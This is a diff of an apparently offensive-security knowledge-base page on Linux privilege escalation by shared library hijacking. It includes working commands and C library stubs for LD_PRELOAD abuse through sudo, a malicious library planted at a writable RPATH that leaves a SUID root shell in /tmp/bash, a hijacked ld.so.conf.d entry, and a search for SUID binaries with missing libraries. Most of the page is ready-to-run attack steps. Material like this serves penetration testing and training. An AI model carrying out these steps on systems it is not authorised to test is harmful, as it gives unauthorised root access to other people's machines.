@@ -3,24 +3,36 @@ id: linux-shared-lib
 title: Shared Library Hijacking
 stage: privesc
 tags: [linux]
-tools:
-  - readelf -d /path/to/binary | grep rpath
-  - ldd /path/to/binary
-  - find / -writable -name "*.so*" 2>/dev/null
-leads_to: [root-linux]
-summary: Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths to execute code as a privileged user.
+summary: Hijack shared library loading via LD_PRELOAD, writable RPATH, or ldconfig paths — a SUID binary or sudo command loading your library runs your code as root.
+leads_to:
+  - root-linux
 ---
 
-## LD_PRELOAD via sudo env_keep
+## Prerequisites
 
-If `sudo -l` shows `env_keep+=LD_PRELOAD`:
+A low-privilege shell. One of: `env_keep+=LD_PRELOAD` in `sudo -l` output, a SUID binary with an RPATH pointing to a writable directory, or write access to a directory in `/etc/ld.so.conf`. `gcc` available for compiling the library (or cross-compile on attacker).
+
+Shared library hijacking exploits the order in which Linux resolves `.so` files. LD_PRELOAD is the simplest — it loads your library before all others — but is stripped for SUID binaries (only works with sudo). RPATH is embedded in the binary and bypasses LD_PRELOAD restrictions, making it exploitable even for SUID. Always run `ldd` on the target binary to see what libraries it loads before writing the payload.
+
+## Quick Win
+
+> Check LD_PRELOAD first (sudo -l), then RPATH (readelf), then missing library deps (ldd).
 
 ```bash
-sudo -l
-# Matching Defaults entries for user:
-#   env_keep+=LD_PRELOAD
+sudo -l | grep LD_PRELOAD
+readelf -d /usr/local/bin/suid_binary | grep -i rpath
+ldd /usr/local/bin/suid_binary | grep "not found"
+```
 
-# Create malicious shared library
+## LD_PRELOAD via sudo
+
+> If `env_keep+=LD_PRELOAD` is in sudo output — compile a library that spawns a root shell.
+
+```bash
+# Check sudo config
+sudo -l
+# Must show: Defaults env_keep+=LD_PRELOAD
+
 cat > /tmp/evil.c << 'EOF'
 #include <stdio.h>
 #include <sys/types.h>
@@ -34,22 +46,24 @@ void _init() {
 EOF
 gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles
 
-# Run any sudo command with evil library
+# Run any allowed sudo binary with the library
 sudo LD_PRELOAD=/tmp/evil.so /any/allowed/command
 ```
 
 ## Writable RPATH
 
+> Binary has RPATH pointing to /tmp or another writable dir — place your library there.
+
 ```bash
-# Check binary's RPATH — a writable directory here = win
+# Find RPATH in the binary
 readelf -d /usr/local/bin/suid_binary | grep -i rpath
 # RPATH: /tmp/lib
 
-# Identify what library is loaded
+# Identify the missing library
 ldd /usr/local/bin/suid_binary
 # libcustom.so.1 => not found
 
-# Create malicious library at the RPATH location
+# Create malicious library in the RPATH location
 cat > /tmp/lib/libcustom.c << 'EOF'
 #include <stdio.h>
 #include <stdlib.h>
@@ -60,50 +74,33 @@ void inject() {
 EOF
 gcc -shared -fPIC -o /tmp/lib/libcustom.so.1 /tmp/lib/libcustom.c
 
-# Run the binary — it loads your library as root
+# Run the binary — loads your library as root
 /usr/local/bin/suid_binary
 /tmp/bash -p
 ```
 
 ## Writable /etc/ld.so.conf.d/
 
+> Add your directory to the global library search path — affects all programs.
+
 ```bash
-# If you can write to ldconfig paths
 ls -la /etc/ld.so.conf.d/
 find /etc/ld.so.conf.d/ -writable 2>/dev/null
 
-# Add your path
 echo "/tmp/lib" > /etc/ld.so.conf.d/evil.conf
 ldconfig
-
-# Now drop malicious library and trigger any program that uses the hijacked lib
+# Now any program loading a library by that name will find yours first
 ```
 
-## Shared Library in Writable Path
+## SUID Binary with Missing Library
+
+> Find SUID binaries that try to load a library that doesn't exist — place yours in the search path.
 
 ```bash
-# Find shared libraries in writable locations
-find / -writable -name "*.so*" 2>/dev/null 2>&1 | grep -v proc
-
-# Find what binary loads a writable .so
-ldd /usr/bin/something | grep "/writable/path/lib.so"
-
-# Overwrite it
-cp /tmp/evil.so /writable/path/lib.so
-```
-
-## Check SUID Binaries for Library Loading
-
-```bash
-# Find SUID binaries, then check their library deps
 find / -perm -4000 2>/dev/null -exec ldd {} \; 2>/dev/null | grep "not found"
-# "not found" = library missing = place yours in search path
+# "not found" = place your library in any directory in ld.so search path
 ```
 
-## Notes
+## Leads To
 
-- `LD_PRELOAD` is ignored for SUID binaries — it only works when the escalation is via sudo
-- RPATH hijacking works even when LD_PRELOAD is blocked because RPATH is embedded in the binary
-- Always run `ldd` to see what libraries a target binary loads before writing the hijack
-- If no RPATH but you can write to a directory already in `/etc/ld.so.conf`, same result
-
+LD_PRELOAD with sudo → bash shell as root → root-linux. RPATH hijack → SUID bash created → `/tmp/bash -p` → root. Missing library exploit → same. LD_PRELOAD is dropped for pure SUID binaries — RPATH and ldconfig bypasses work even when LD_PRELOAD is restricted.
